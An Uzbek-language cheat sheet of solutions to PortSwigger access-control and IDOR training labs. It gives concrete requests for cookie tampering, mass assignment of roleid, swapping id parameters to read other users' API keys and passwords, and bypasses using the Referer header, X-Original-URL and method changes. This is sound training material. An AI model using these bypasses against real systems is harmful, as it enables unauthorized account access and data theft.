# Access Control / IDOR — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**. Account link odatda `/users/youraccount` yoki
> `/users/youraccount/personaldetails`. Test user: `wiener:peter`. Nishon: `carlos`.
> IDOR = parametr/id'ni boshqasinikiga almashtirib, o'zgalarning ma'lumotiga tegish.

---

## Admin funksiya himoyasiz

### Unprotected admin functionality — APPRENTICE
```
https://example.com/robots.txt        → Disallow qatorida admin path chiqadi
https://example.com/administrator-panel
```
> `/administrator-panel` → carlos'ni o'chir.

### Unprotected admin, unpredictable URL — APPRENTICE
Admin URL JS ichida (sahifa source'da) oshkor bo'lgan.
```
View source → <script> ichidan admin panel URL'ini top → o'sha URL → carlos delete
```

---

## Rolni o'zgartirish

### User role controlled by request parameter — APPRENTICE
Login javobidagi cookie'ni o'zgartirasan.
```
Burp: response intercept → Set-Cookie: Admin=false  →  Admin=true
→ /admin → carlos delete
```

### User role modifiable in profile (mass assignment) — APPRENTICE
Email update JSON'iga `roleid` qo'shasan.
```
POST /users/youraccount/personaldetails  (JSON body)
{"email":"...","roleid":2}
→ roleid=2 bo'ladi → /admin → carlos delete
```

### User role controlled by request parameter (multi-step) — PRACTITIONER
Admin bo'lib (`administrator:admin`) promotion confirmation so'rovini ushlab, wiener session
va username bilan replay qilasan — oxirgi qadam access tekshirmaydi.

---

## IDOR — id parametri

### User ID controlled by request parameter — APPRENTICE
```
GET /users/youraccount?id=wiener   →   id=carlos
→ javobdan carlos API key'ini ol
```

### Unpredictable user IDs (GUID) — APPRENTICE
```
Blog post → carlos profili → URL'dagi GUID'ni ol
GET /users/youraccount?id=<carlos-GUID>  →  API key
```

### Data leakage in redirect — APPRENTICE
```
id=carlos  →  302 redirect, lekin BODY ichida carlos API key qoladi
```

### Password disclosure — APPRENTICE
```
GET /users/youraccount/personaldetails?id=administrator
→ javobda admin paroli (masked input value) → admin login → carlos delete
```

### Insecure direct object references (static file) — APPRENTICE
Live chat transcript fayli ketma-ket raqam.
```
View transcript → URL: /download-transcript/2.txt  →  1.txt
→ 1.txt ichida carlos paroli → carlos login
```

---

## Platform / header bypass

### Multi-step process, bitta qadamda access control yo'q — PRACTITIONER
`administrator:admin` bilan promotion oqimini o'rgan → confirmation so'rovini wiener session +
`username=wiener` bilan replay. Oxirgi qadam access tekshirmaydi.

### Referer-based access control — PRACTITIONER
Promotion so'rovi faqat Referer orqali himoyalangan.
```
GET /admin-roles?username=wiener&action=upgrade
Cookie: <wiener session>
Referer: https://example.com/admin      (Referer bor bo'lsa o'tadi)
```

### URL-based access control circumvented (X-Original-URL) — PRACTITIONER
Front-end `/admin` ni bloklaydi, back-end `X-Original-URL` ni o'qiydi.
```
GET / HTTP/1.1
X-Original-URL: /admin

GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

### Method-based access control circumvented — PRACTITIONER
POST himoyalangan, GET emas.
```
POST /admin-roles (wiener cookie) → Unauthorized
→ Change request method → GET /admin-roles?username=wiener&action=upgrade → ishlaydi
```

---

### Eslatma
IDOR = eng ko'p to'laydigan, eng oson bug. Har id/username/filename/GUID ni almashtirib ko'r.
Himoya: har so'rovda server-side authorization. Umumiy: bu papka README.
